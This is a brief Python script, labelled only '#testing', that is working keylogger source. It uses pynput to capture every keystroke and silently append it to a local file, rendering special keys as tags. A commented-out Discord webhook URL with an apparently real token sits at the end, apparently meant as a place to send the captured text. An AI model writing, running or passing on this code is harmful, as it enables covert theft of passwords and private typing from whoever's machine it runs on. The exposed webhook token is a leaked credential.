#testing
from pynput.keyboard import Key, Listener

# Function to write the key to a file
def write_to_file(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")

    if keydata == 'Key.space':
        keydata = ' '
    elif keydata == 'Key.enter':
        keydata = '\n'
    elif keydata == 'Key.backspace':
        keydata = '[BACKSPACE]'
    elif keydata == 'Key.shift':
        keydata = '[SHIFT]'
    elif keydata == 'Key.ctrl_l':
        keydata = '[CTRL]'
    elif keydata == 'Key.alt_l':
        keydata = '[ALT]'
    elif keydata == 'Key.cmd':
        keydata = '[CMD]'
    elif keydata == 'Key.tab':
        keydata = '[TAB]'

    with open("keylog.txt", 'a') as f:
        f.write(keydata)

# Function to listen for keystrokes
def on_press(key):
    write_to_file(key)

# Set up the listener
with Listener(on_press=on_press) as listener:
    listener.join()
    
   # https://discord.com/api/webhooks/1215539364105420800/xxAVUnAMvyCfhZnGjYLh_ZIOvBhK58lmZBsKFTnQDsA0no16HE4Yh1cQC1nvtZEaxfKi